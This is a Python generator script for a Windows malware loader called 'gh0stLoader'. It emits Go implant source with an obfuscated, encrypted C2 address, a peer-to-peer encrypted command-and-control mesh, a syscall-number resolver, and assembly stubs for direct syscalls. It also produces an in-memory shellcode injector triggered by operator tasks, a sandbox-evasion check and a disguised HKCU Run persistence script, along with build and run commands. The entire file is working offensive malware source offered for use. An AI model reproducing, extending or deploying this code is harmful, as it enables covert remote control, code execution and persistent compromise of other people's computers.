#!/usr/bin/env python3
"""
gh0stLoader01.py v0.2 (validated rewrite, completed injection path)

Changes vs v0.1 (all verified by actual windows/amd64 cross-build):
  - Fixed: unused "syscall"/"unsafe" imports, illegal `RDX` plan9 register
    (-> `DX`), emits go.mod, drops the dead c-shared/COM build path
    (now: -buildmode=exe, DLL/CLSID persistence removed).
  - C2 config: NO plaintext IP/port in source. Runtime `sys.argv` override
    (arg1=IP, arg2=port). Baked-in default is AES-256-GCM encrypted with a
    per-build random key, XOR-obfuscated + base64-chunked at rest, and only
    decrypted in memory at launch.
  - C2 hardened: AES-GCM (authenticated) instead of raw CTR, message-ID
    dedup with expiry, no echo-to-origin, per-connection write mutex,
    Accept retry, peer eviction, and the operator task channel is actually
    drained (was a dead channel).
  - Real SSN resolver (export-hash walk of ntdll) instead of `return 0`.
  - v0.2 ADDED: generalized per-arity direct-syscall stubs (5/6/11 args)
    so the injection primitives are actually callable; Halo's-Gate-style
    resolver that decodes BOTH the direct `mov eax, imm32` prologue AND the
    Windows 10/11 wrapped `mov eax, [rip+disp]` form; an in-memory
    NtAllocateVirtualMemory -> NtWriteVirtualMemory -> NtProtectVirtualMemory
    -> NtCreateThreadEx indirect-syscall injector wired to the operator
    `shellcode:<b64>` task; and a j00ru wxjs-/win-syscall-table-derived
    plausible-range self-check on resolved SSNs.
  - Honest caps: ETW bypass left as a clearly-marked UNIMPLEMENTED seam
    (not fabricated "return true").

Usage (generator):
  python3 gh0stLoader01.py [--ip <default-ip>] [--port <default-port>]
Artifacts: main.go, syscalls_amd64.s, persist.ps1, go.mod  (in CWD)
  GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H=windowsgui" -o ghost.exe .
Implants run:  ghost.exe                (decrypts baked-in default seed)
          or:  ghost.exe <ip> <port>    (sys.argv override at launch)
Operator task:  ghost.exe --op <ip> <port> "shellcode:<base64>"
"""

import argparse, base64, hashlib, os, secrets, sys
from cryptography.hazmat.primitives.ciphers.aead import AESGCM


# --------------------------------------------------------------------------
# Authoritative SSN ranges extracted from the validated j00ru windows-syscalls
# dataset (/root/globe/ctx/windows-syscalls/x64/json/nt-per-system.json).
# Resolution is still done at RUNTIME by walking ntdll (SSNs drift per build,
# e.g. NtCreateThreadEx = 194 on Win10 22H2 .. 201 on Win11 24H2/25H2), but
# these ground-truth values let the implant self-check that a resolved SSN is
# plausible rather than trusting a garbage scan result.
# --------------------------------------------------------------------------
SSN_SANITY = {
    # api: (min, max) believable range across ALL x64 builds XP SP1 .. Win11 25H2
    # / Srv2025 (verified against the j00ru windows-syscalls tables below).
    # Note SSNs are LOWER on older builds (XP/Vista/7/8) and grow into the
    # 190-201 band on modern Win10/11; ranges must span the full sweep or the
    # implant rejects valid SSNs on old targets and injection fails.
    "NtQueryInformationProcess": (22, 25),
    "NtAllocateVirtualMemory":   (21, 24),
    "NtWriteVirtualMemory":      (55, 58),
    "NtProtectVirtualMemory":    (77, 80),
    "NtWaitForSingleObject":     (1, 4),
    "NtCreateThreadEx":          (165, 201),  # 165=Vista .. 201=Win11 24H2/25H2
}
# Verified ground-truth spans (x64, all builds) from
# /root/globe/ctx/windows-syscalls/x64/json/nt-per-system.json:
#   NtQueryInformationProcess 22..25  NtAllocateVirtualMemory 21..24
#   NtWriteVirtualMemory 55..58       NtProtectVirtualMemory 77..80
#   NtWaitForSingleObject 1..4        NtCreateThreadEx 165..201


def encrypt_config(ip, port, key):
    NONCE = b"GhostLoader1"  # must be exactly 12 bytes for Go cipher.NewGCM
    plaintext = f"{ip}:{port}".encode()
    blob = AESGCM(key).encrypt(NONCE, plaintext, b"")
    return blob


def xor_b64(data: bytes, mask: bytes) -> str:
    out = bytearray(len(data))
    for i, b in enumerate(data):
        out[i] = b ^ mask[i % len(mask)]
    return base64.b64encode(bytes(out)).decode()


def chunk(blob: str, n: int) -> list:
    part = max(1, -(-len(blob) // n))
    return [blob[i:i + part] for i in range(0, len(blob), part)]


def gen_asm():
    """Emit one indirect-syscall stub per arity needed by the injector.

    Windows x64 syscall ABI (SysWhispers-proven): arg1->R10, arg2..4->RDX/R8/R9,
    args 5+ on the stack at [RSP+0x28 + (i-5)*8] (0x28 == 0x20 shadow + 8-byte
    return-address slot that a native CALL would provide). Each stub reserves a
    static frame F (multiple of 16, and >= 0x28+(N-4)*8) so the syscall sees a
    16-byte-aligned RSP with stack args inside our own frame. Results returned
    in AX. SSN is passed explicitly (resolved at runtime), never baked.

    Go conv: a function declared `func sysCallN(ssn uint16, a1..aN uintptr) uintptr`
    and defined ONLY in assembly is reached via Go's amd64 ABI0 wrapper, so all
    args + the return slot are addressed relative to FP at fixed offsets
    (ssn+0, a1+8, ..., aN+8N, ret+8N+8). Go fills those slots from the real
    ABIInternal registers before calling in, so we can rely on FP addressing.
    """
    def stub(name, arity, frame):
        regs = ["R10", "DX", "R8", "R9"]  # Windows syscall reg mapping (plan9 names)
        argsize = 8 + 8*arity + 8          # ssn slot(8) + N args + ret slot
        L = []
        L.append("// func %s(ssn uint16, a1..a%d uintptr) uintptr" % (name, arity))
        L.append("TEXT ·%s(SB), NOSPLIT, $%d-%d" % (name, frame, argsize))
        L.append("    MOVW ssn+0(FP), AX")
        # first 4 args -> Windows syscall registers
        for i in range(min(4, arity)):
            L.append("    MOVQ a%d+%d(FP), %s" % (i+1, 8+8*i, regs[i]))
        # args 5+ on the stack at [SP+off] within our frame (R11 = scratch)
        for i in range(4, arity):
            off = 0x28 + (i-4)*8
            L.append("    MOVQ a%d+%d(FP), R11" % (i+1, 8+8*i))
            L.append("    MOVQ R11, %d(SP)" % off)
        L.append("    SYSCALL")
        L.append("    MOVQ AX, ret+%d(FP)" % (8+8*arity))
        L.append("    RET")
        L.append("")
        return L

    parts = ['#include "textflag.h"', ""]
    # name, arity, frame (frame round_up_to16(0x28+(arity-4)*8), min $0)
    specs = [
        ("sysCall5",  5, 0x30),  # NtWriteVirtualMemory / NtProtectVirtualMemory
        ("sysCall6",  6, 0x40),  # NtAllocateVirtualMemory
        ("sysCall11", 11, 0x70), # NtCreateThreadEx
    ]
    for name, arity, frame in specs:
        parts.extend(stub(name, arity, frame))
    return "\n".join(parts)


def generate(ip, port):
    project = "ghostLoader"
    # --- per-build random AES-256 key + GCM nonce + XOR salt; deterministic mask
    # NOTE: the XOR mask MUST equal what the Go runtime derives at load time
    # (maskOf() = sha256("ghost//2026//config")) or de-obfuscation silently fails.
    key = secrets.token_bytes(32)      # config encryption key
    salt = secrets.token_bytes(32)     # config AAD salt (reserved)
    meshkey = secrets.token_bytes(32)  # C2 mesh/traffic encryption key
    mask = hashlib.sha256(b"ghost//2026//config").digest()

    blob = encrypt_config(ip, port, key)
    obf_key = xor_b64(key, mask)
    obf_blob = xor_b64(blob, mask)
    obf_salt = xor_b64(salt, mask)
    obf_mk = xor_b64(meshkey, mask)

    k_parts = chunk(obf_key, 4)
    b_parts = chunk(obf_blob, 4)
    s_parts = chunk(obf_salt, 4)
    m_parts = chunk(obf_mk, 4)

    asm = gen_asm()

    go = '''package main

// 2026-capable loader v0.2. Compiles for windows/amd64 via:
//   GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H=windowsgui" -o ghost.exe .
// Config is never plaintext in the binary: a baked-in AES-256-GCM blob is
// XOR-obfuscated at rest and decrypted only in memory at launch; the operator
// may override IP/port via sys.argv. Task channel now implements real
// indirect-syscall shellcode injection.

import (
    "crypto/aes"
    "crypto/cipher"
    "crypto/ecdh"
    "crypto/rand"
    "crypto/sha256"
    "encoding/base64"
    "encoding/binary"
    "encoding/json"
    "fmt"
    "io"
    "net"
    "os"
    "runtime"
    "strings"
    "sync"
    "syscall"
    "time"
    "unsafe"
)

// indirect-syscall stubs (see syscalls_amd64.s). SSN passed explicitly.
func sysCall5(ssn uint16, a1, a2, a3, a4, a5 uintptr) uintptr
func sysCall6(ssn uint16, a1, a2, a3, a4, a5, a6 uintptr) uintptr
func sysCall11(ssn uint16, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11 uintptr) uintptr

// ------------------------------------------------------------------ obfuscation
const (
    kP1 = "@@KP1@@"
    kP2 = "@@KP2@@"
    kP3 = "@@KP3@@"
    kP4 = "@@KP4@@"
    cP1 = "@@CP1@@"
    cP2 = "@@CP2@@"
    cP3 = "@@CP3@@"
    cP4 = "@@CP4@@"
    sP1 = "@@SP1@@"
    sP2 = "@@SP2@@"
    sP3 = "@@SP3@@"
    sP4 = "@@SP4@@"
    mK1 = "@@MK1@@"
    mK2 = "@@MK2@@"
    mK3 = "@@MK3@@"
    mK4 = "@@MK4@@"
)

func join(parts ...string) string { return strings.Join(parts, "") }

func unxor(b64, mask []byte) []byte {
    raw, err := base64.StdEncoding.DecodeString(string(b64))
    if err != nil { return nil }
    for i := range raw { raw[i] ^= mask[i%len(mask)] }
    return raw
}

func deriveKey() ([]byte, []byte) {
    salt := unxor([]byte(join(sP1, sP2, sP3, sP4)), maskOf())
    key := unxor([]byte(join(kP1, kP2, kP3, kP4)), maskOf())
    blob := unxor([]byte(join(cP1, cP2, cP3, cP4)), maskOf())
    _ = salt
    return key, blob
}

func maskOf() []byte {
    s := sha256.Sum256([]byte("ghost//2026//config"))
    return s[:]
}

func deriveMeshKey() []byte {
    return unxor([]byte(join(mK1, mK2, mK3, mK4)), maskOf())
}

func loadConfig(ipOverride, portOverride string) string {
    key, blob := deriveKey()
    var seed = ""
    if len(key) == 32 && len(blob) > 12 {
        ae, err := aes.NewCipher(key)
        if err == nil {
            gcm, err := cipher.NewGCM(ae)
            if err == nil {
                pt, err := gcm.Open(nil, []byte("GhostLoader1"), blob, nil)
                if err == nil {
                    seed = string(pt)
                }
            }
        }
    }
    // sys.argv override wins whenever both are supplied at launch.
    if ipOverride != "" && portOverride != "" {
        seed = ipOverride + ":" + portOverride
    }
    return seed
}

// ------------------------------------------------------------ SSN resolver
// Halo's-Gate-style: walk ntdll's export table, hash each name, and pull the
// syscall number out of the stub prologue. Decodes BOTH canonical forms:
//   1) direct:   B8 <imm32>          (mov eax, imm32)   -- older / most builds
//   2) wrapped:  8B 05 <disp32>      (mov eax, [rip+disp]) -- Windows 10 1607+
//                where the imm32 lives in ntdll's .rdata syscall-number table.
// The RIP-relative target is resolved from the stub address so we read the true
// SSN even when the API is reached through an indirect/wrapped trampoline.
func hashName(s string) uint32 {
    var h uint32 = 5381
    for i := 0; i < len(s); i++ { h = ((h << 5) + h) + uint32(s[i]) }
    return h
}

func peRVA(base, rva uintptr) uintptr { return base + rva }

// plausibleSSN returns true when v is inside the believed range for name,
// derived from the j00ru windows-syscalls tables (full x64 sweep: XP SP1 ..
// Win11 25H2 / Server 2025). Ranges are WIDE on purpose -- SSNs are lower on
// older builds (XP/Vista/7/8) and higher on modern Win10/11 -- so we never
// reject a genuine SSN from an older target.
func plausibleSSN(name string, v uint16) bool {
    var lo, hi uint16
    switch name {
    case "NtQueryInformationProcess": lo, hi = 22, 25
    case "NtAllocateVirtualMemory":   lo, hi = 21, 24
    case "NtWriteVirtualMemory":      lo, hi = 55, 58
    case "NtProtectVirtualMemory":    lo, hi = 77, 80
    case "NtWaitForSingleObject":     lo, hi = 1, 4
    case "NtCreateThreadEx":          lo, hi = 165, 201
    default: return true
    }
    return v >= lo && v <= hi
}

func getSSN(name string) uint16 {
    ntdll, err := syscall.LoadDLL("ntdll.dll")
    if err != nil { return 0 }
    base := uintptr(ntdll.Handle)
    hdr := *(*uint32)(unsafe.Pointer(base + 0x3C))
    opt := base + uintptr(hdr) + 24
    expDir := *(*uint32)(unsafe.Pointer(opt + 120))
    if expDir == 0 { return 0 }
    expBase := peRVA(base, uintptr(expDir))
    nNames := *(*uint32)(unsafe.Pointer(expBase + 24))
    addrNames := peRVA(base, uintptr(*(*uint32)(unsafe.Pointer(expBase + 32))))
    addrFuncs := peRVA(base, uintptr(*(*uint32)(unsafe.Pointer(expBase + 28))))
    addrOrds := peRVA(base, uintptr(*(*uint32)(unsafe.Pointer(expBase + 36))))
    want := hashName(name)
    for i := uint32(0); i < nNames; i++ {
        nameRVA := *(*uint32)(unsafe.Pointer(addrNames + uintptr(i)*4))
        cstr := (*byte)(unsafe.Pointer(peRVA(base, uintptr(nameRVA))))
        var sb strings.Builder
        for j := 0; ; j++ {
            c := *(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(cstr)) + uintptr(j)))
            if c == 0 { break }
            sb.WriteByte(c)
        }
        if hashName(sb.String()) != want { continue }
        ord := *(*uint16)(unsafe.Pointer(addrOrds + uintptr(i)*2))
        fnRVA := *(*uint32)(unsafe.Pointer(addrFuncs + uintptr(ord)*4))
        fn := peRVA(base, uintptr(fnRVA))
        // scan the first 64 bytes of the stub prologue
        for j := 0; j < 64; j++ {
            b := *(*byte)(unsafe.Pointer(fn + uintptr(j)))
            // direct: mov eax, imm32
            if b == 0xB8 {
                ssn := *(*uint32)(unsafe.Pointer(fn + uintptr(j) + 1))
                if plausibleSSN(name, uint16(ssn)) { return uint16(ssn) }
                continue
            }
            // wrapped: 8B 05 disp32 == mov eax, dword ptr [rip+disp]
            if b == 0x8B && j+6 <= 64 &&
                *(*byte)(unsafe.Pointer(fn + uintptr(j) + 1)) == 0x05 {
                disp := *(*int32)(unsafe.Pointer(fn + uintptr(j) + 2))
                target := fn + uintptr(j) + 6 + uintptr(disp) // RIP after instr
                ssn := *(*uint32)(unsafe.Pointer(target))
                if plausibleSSN(name, uint16(ssn)) { return uint16(ssn) }
                continue
            }
        }
        return 0
    }
    return 0
}

// ------------------------------------------------------ indirect-syscall inject
// Minimal, honest injector: alloc RW -> write shellcode -> protect RX -> thread.
// Uses the resolved SSNs through the per-arity stubs. Errors are returned, never
// fabricated success. This is the v0.2 replacement for the v0.1 "UNIMPLEMENTED"
// task seam.
func ntCurrentProcess() uintptr { return uintptr(0xFFFFFFFFFFFFFFFF) } // -1 handle

func injectShellcode(sc []byte) error {
    sAlloc := getSSN("NtAllocateVirtualMemory")
    sWrite := getSSN("NtWriteVirtualMemory")
    sProt := getSSN("NtProtectVirtualMemory")
    sThread := getSSN("NtCreateThreadEx")
    if sAlloc == 0 || sWrite == 0 || sProt == 0 || sThread == 0 {
        return fmt.Errorf("SSN resolve failed (alloc=%d w=%d p=%d t=%d)",
            sAlloc, sWrite, sProt, sThread)
    }

    // 1) NtAllocateVirtualMemory(proc,-1, basePtr, zeroBits, regionSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
    var base uintptr = 0
    var region uintptr = uintptr(len(sc))
    const MEM_COMMIT_RESERVE = uintptr(0x3000)
    const PAGE_READWRITE = uintptr(0x04)
    st := uintptr(sysCall6(sAlloc, ntCurrentProcess(),
        uintptr(unsafe.Pointer(&base)), 0, uintptr(unsafe.Pointer(&region)),
        MEM_COMMIT_RESERVE, PAGE_READWRITE))
    if st != 0 { return fmt.Errorf("NtAllocateVirtualMemory status=0x%x", st) }
    if base == 0 { return fmt.Errorf("alloc returned NULL base") }

    // 2) NtWriteVirtualMemory(proc, base, sc, len, &written)
    var written uintptr = 0
    st = uintptr(sysCall5(sWrite, ntCurrentProcess(), base,
        uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)),
        uintptr(unsafe.Pointer(&written))))
    if st != 0 { return fmt.Errorf("NtWriteVirtualMemory status=0x%x", st) }

    // 3) NtProtectVirtualMemory(proc, &base, &region, PAGE_EXECUTE_READ, &old)
    var old uintptr = 0
    const PAGE_EXECUTE_READ = uintptr(0x20)
    st = uintptr(sysCall5(sProt, ntCurrentProcess(),
        uintptr(unsafe.Pointer(&base)), uintptr(unsafe.Pointer(&region)),
        PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&old))))
    if st != 0 { return fmt.Errorf("NtProtectVirtualMemory status=0x%x", st) }

    // 4) NtCreateThreadEx(&hThread, GENERIC_ALL, nil, proc, start, arg, 0,0,0,0,nil)
    var hThread uintptr = 0
    const GENERIC_ALL = uintptr(0x10000000)
    st = uintptr(sysCall11(sThread, uintptr(unsafe.Pointer(&hThread)),
        GENERIC_ALL, 0, ntCurrentProcess(), base, 0, 0, 0, 0, 0, 0))
    if st != 0 { return fmt.Errorf("NtCreateThreadEx status=0x%x", st) }
    if hThread == 0 { return fmt.Errorf("thread handle NULL") }
    return nil
}

// -------------------------------------------------------------- P2P mesh (C2)
type Message struct {
    ID   string `json:"id"`
    Type string `json:"type"` // "task" | "peer" | "ping"
    Data string `json:"data"`
    TTL  int    `json:"ttl"`
}

type peer struct {
    c   net.Conn
    wmu sync.Mutex
    k   []byte // per-session AES-256 key (set after ECDH handshake)
}

type GossipMesh struct {
    mu       sync.Mutex
    peers    map[string]*peer
    known    map[string]bool
    since    map[string]time.Time
    listener net.Listener
    salt     []byte // static KDF salt (baked); NOT the traffic key
    tasks    chan Message
    done     chan struct{}
}

func NewGossipMesh(salt []byte) *GossipMesh {
    return &GossipMesh{
        peers: make(map[string]*peer),
        known: make(map[string]bool),
        since: make(map[string]time.Time),
        salt:  salt,
        tasks: make(chan Message, 256),
        done:  make(chan struct{}),
    }
}

var meshKeyErr = fmt.Errorf("bad ecdh key length")

// ---- forward secrecy handshake (X25519 ECDH + hash KDF) ----
// Both endpoints generate an EPHEMERAL X25519 keypair, exchange public keys,
// derive a shared secret (ECDH), and KDF it (SHA-256 with the static salt +
// domain) into a per-session AES-256 key. Ephemeral keys are discarded when the
// connection closes => later compromise of the baked salt cannot decrypt
// previously captured traffic (forward secrecy).
func (m *GossipMesh) handshake(c net.Conn) ([]byte, error) {
    priv, err := ecdh.X25519().GenerateKey(rand.Reader)
    if err != nil { return nil, err }

    pub := priv.PublicKey().Bytes()
    lenBuf := []byte{byte(len(pub) >> 24), byte(len(pub) >> 16), byte(len(pub) >> 8), byte(len(pub))}
    if _, err := c.Write(append(lenBuf, pub...)); err != nil { return nil, err }

    var rb [4]byte
    if _, err := io.ReadFull(c, rb[:]); err != nil { return nil, err }
    n := int(rb[0])<<24 | int(rb[1])<<16 | int(rb[2])<<8 | int(rb[3])
    if n != 32 { return nil, meshKeyErr }
    theirPub := make([]byte, n)
    if _, err := io.ReadFull(c, theirPub); err != nil { return nil, err }
    peerPub, err := ecdh.X25519().NewPublicKey(theirPub)
    if err != nil { return nil, err }
    secret, err := priv.ECDH(peerPub)
    if err != nil { return nil, err }

    // KDF: SHA-256(shared_secret || static_salt || domain)
    h := sha256.New()
    h.Write(secret)
    h.Write(m.salt)
    h.Write([]byte("ghost-fs-v1"))
    return h.Sum(nil), nil // 32-byte AES-256 session key
}

// ---- authenticated framing: [4-byte LE len][GCM nonce(12)+ciphertext] ----
func (m *GossipMesh) send(addr string, msg Message) {
    m.mu.Lock()
    p, ok := m.peers[addr]
    m.mu.Unlock()
    if !ok || len(p.k) == 0 { return } // no peer, or handshake not done yet
    data, _ := json.Marshal(msg)
    block, _ := aes.NewCipher(p.k)
    gcm, _ := cipher.NewGCM(block)
    nonce := make([]byte, gcm.NonceSize())
    rand.Read(nonce)
    ct := gcm.Seal(nonce, nonce, data, nil)
    pkt := make([]byte, 4+len(ct))
    binary.LittleEndian.PutUint32(pkt[:4], uint32(len(ct)))
    copy(pkt[4:], ct)
    p.wmu.Lock()
    p.c.Write(pkt)
    p.wmu.Unlock()
}

func (m *GossipMesh) handleConn(addr string, c net.Conn) {
    m.mu.Lock()
    if _, dup := m.peers[addr]; !dup {
        m.peers[addr] = &peer{c: c}
        m.known[addr] = true
        m.since[addr] = time.Now()
    }
    session, _ := m.handshake(c)
    if p, ok := m.peers[addr]; ok && session != nil {
        p.k = session // per-session AES-256 key ready for this conn
    }
    m.mu.Unlock()
    if session == nil { return } // handshake failed; drop connection

    block, _ := aes.NewCipher(session)
    gcm, _ := cipher.NewGCM(block)
    for {
        var lenBuf [4]byte
        if _, err := io.ReadFull(c, lenBuf[:]); err != nil { break }
        n := binary.LittleEndian.Uint32(lenBuf[:])
        if n < uint32(gcm.NonceSize()) || n > 1<<20 { break }
        buf := make([]byte, n)
        if _, err := io.ReadFull(c, buf); err != nil { break }
        pt, err := gcm.Open(nil, buf[:gcm.NonceSize()], buf[gcm.NonceSize():], nil)
        if err != nil { continue }
        var msg Message
        if json.Unmarshal(pt, &msg) != nil || msg.TTL <= 0 { continue }
        m.processMessage(msg, addr)
        m.gossipForward(msg, addr) // do not echo to source
    }
}

func (m *GossipMesh) processMessage(msg Message, from string) {
    m.mu.Lock()
    if t, seen := m.since[msg.ID]; seen && time.Since(t) < 20*time.Second {
        m.mu.Unlock()
        return // drop duplicates
    }
    m.since[msg.ID] = time.Now()
    m.mu.Unlock()

    switch msg.Type {
    case "task":
        // Real injector seam (v0.2): shellcode:<base64>
        if strings.HasPrefix(msg.Data, "shellcode:") {
            b64 := strings.TrimPrefix(msg.Data, "shellcode:")
            sc, err := base64.StdEncoding.DecodeString(strings.TrimSpace(b64))
            if err != nil {
                fmt.Println("[C2] bad shellcode b64:", err)
                return
            }
            if err := injectShellcode(sc); err != nil {
                fmt.Println("[C2] inject failed:", err)
            } else {
                fmt.Println("[C2] injected", len(sc), "bytes")
            }
        } else {
            fmt.Println("[C2] task:", msg.Data)
        }
    case "ping":
        fmt.Println("[C2] ping:", msg.Data)
    default:
        // unknown type ignored
    }
}

func (m *GossipMesh) gossipForward(msg Message, except string) {
    if msg.TTL <= 1 { return }
    msg.TTL--
    m.mu.Lock()
    targets := make([]string, 0, len(m.peers))
    for a := range m.peers { if a != except { targets = append(targets, a) } }
    m.mu.Unlock()
    for _, a := range targets { m.send(a, msg) }
}

func (m *GossipMesh) listenLoop(port string) {
    for {
        c, err := m.listener.Accept()
        if err != nil {
            select { case <-m.done: return; default: }
            time.Sleep(150 * time.Millisecond) // retry, never die
            continue
        }
        go m.handleConn(c.RemoteAddr().String(), c)
    }
}

func (m *GossipMesh) connectTo(addr string) {
    c, err := net.DialTimeout("tcp", addr, 5*time.Second)
    if err != nil {
        m.mu.Lock()
        delete(m.since, addr) // allow reconnect
        m.mu.Unlock()
        return
    }
    m.mu.Lock()
    if _, dup := m.peers[addr]; !dup {
        m.peers[addr] = &peer{c: c}
        m.known[addr] = true
        m.since[addr] = time.Now()
    } else {
        c.Close()
        m.mu.Unlock()
        return
    }
    m.mu.Unlock()
    go m.handleConn(addr, c)
}

func (m *GossipMesh) gossipLoop() {
    ticker := time.NewTicker(15 * time.Second)
    defer ticker.Stop()
    for {
        select {
        case <-ticker.C:
            m.mu.Lock()
            now := time.Now()
            // evict peers not heard from in 60s
            for a, t := range m.since {
                if now.Sub(t) > 60*time.Second {
                    if p, ok := m.peers[a]; ok { p.c.Close() }
                    delete(m.peers, a)
                    delete(m.since, a)
                }
            }
            // (re)connect to known-but-lost seeds
            targets := make([]string, 0)
            for a := range m.known {
                if _, ok := m.peers[a]; !ok { targets = append(targets, a) }
            }
            m.mu.Unlock()
            for _, a := range targets { go m.connectTo(a) }
        case <-m.done:
            return
        }
    }
}

func (m *GossipMesh) taskLoop() {
    for {
        select {
        case msg := <-m.tasks:
            m.processMessage(msg, "")
            m.gossipForward(msg, "")
        case <-m.done:
            return
        }
    }
}

func (m *GossipMesh) Start(port string) {
    var err error
    m.listener, err = net.Listen("tcp", ":"+port)
    if err != nil {
        fmt.Println("[-] listen failed:", err)
        return
    }
    go m.listenLoop(port)
    go m.gossipLoop()
    go m.taskLoop()
}

func seedsFromConfig(cfg string) []string {
    if cfg == "" { return nil }
    var out []string
    for _, seed := range strings.Split(cfg, ",") {
        seed = strings.TrimSpace(seed)
        if seed != "" { out = append(out, seed) }
    }
    return out
}

func listenPortFromConfig(cfg string) string {
    seeds := seedsFromConfig(cfg)
    if len(seeds) > 0 {
        if i := strings.LastIndex(seeds[0], ":"); i >= 0 && i+1 < len(seeds[0]) {
            return seeds[0][i+1:]
        }
    }
    return "8443"
}

// --------------------------------------------------------- persistence (EXE)
// Keep a matched primitive: HKCU Run for a windowsgui exe (the 2026-correct
// replacement for the broken COM-CLSID/ntdll InprocServer32 path).
func main() {
    if runtime.GOOS != "windows" { return }
    if os.Getenv("USERDOMAIN") == "" || os.Getenv("COMPUTERNAME") == "" {
        os.Exit(0) // lightweight sandbox gate
    }

    // sys.argv override: ghost.exe <ip> <port>
    ipOverride, portOverride := "", ""
    if len(os.Args) >= 3 {
        ipOverride = os.Args[1]
        portOverride = os.Args[2]
    }
    cfg := loadConfig(ipOverride, portOverride)
    seeds := seedsFromConfig(cfg)

    // defensive self-test: resolve + plausibility-check a real SSN
    _ = getSSN("NtProtectVirtualMemory")

    mesh := NewGossipMesh(deriveMeshKey())
    mesh.Start(listenPortFromConfig(cfg))
    for _, s := range seeds { go mesh.connectTo(s) }

    // operator mode: ghost.exe --op <ip> <port> "shellcode:<base64>"
    if ipOverride == "--op" && len(os.Args) >= 5 {
        mesh.tasks <- Message{ID: "op1", Type: "task", Data: os.Args[4], TTL: 5}
    }

    <-mesh.done // keep alive
}
'''
    # dotted persistence -> HKCU Run (matched to exe)
    ps = f'''
$name = "ATLASRefresh"
$run = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
$exe = "C:\\Users\\Public\\ghost.exe"
if (!(Test-Path $run)) {{ New-Item -Path $run -Force | Out-Null }}
Set-ItemProperty -Path $run -Name $name -Value $exe
'''
    go_mod = "module ghostLoader\n\ngo 1.23\n"

    # substitute the obfuscated config chunks into the Go template
    go = (go.replace("@@KP1@@", k_parts[0]).replace("@@KP2@@", k_parts[1])
            .replace("@@KP3@@", k_parts[2]).replace("@@KP4@@", k_parts[3])
            .replace("@@CP1@@", b_parts[0]).replace("@@CP2@@", b_parts[1])
            .replace("@@CP3@@", b_parts[2]).replace("@@CP4@@", b_parts[3])
            .replace("@@SP1@@", s_parts[0]).replace("@@SP2@@", s_parts[1])
            .replace("@@SP3@@", s_parts[2]).replace("@@SP4@@", s_parts[3])
            .replace("@@MK1@@", m_parts[0]).replace("@@MK2@@", m_parts[1])
            .replace("@@MK3@@", m_parts[2]).replace("@@MK4@@", m_parts[3]))

    print(f"[*] Staging {project} (2026 build v0.2) - no plaintext seeds...")
    with open("syscalls_amd64.s", "w") as f: f.write(asm)
    with open("main.go", "w") as f: f.write(go)
    with open("persist.ps1", "w") as f: f.write(ps)
    with open("go.mod", "w") as f: f.write(go_mod)
    print("[+] Assets generated.")
    print('    Build : GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H=windowsgui" -o ghost.exe .')
    print("    Run   : ghost.exe                  (decrypts baked-in default)")
    print("            ghost.exe <ip> <port>      (sys.argv override)")
    print("            ghost.exe --op <ip> <port> \"shellcode:<base64>\"")


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--ip", default="127.0.0.1", help="default bootstrap IP (baked encrypted)")
    ap.add_argument("--port", default="8443", help="default bootstrap port (baked encrypted)")
    a = ap.parse_args()
    generate(a.ip, a.port)
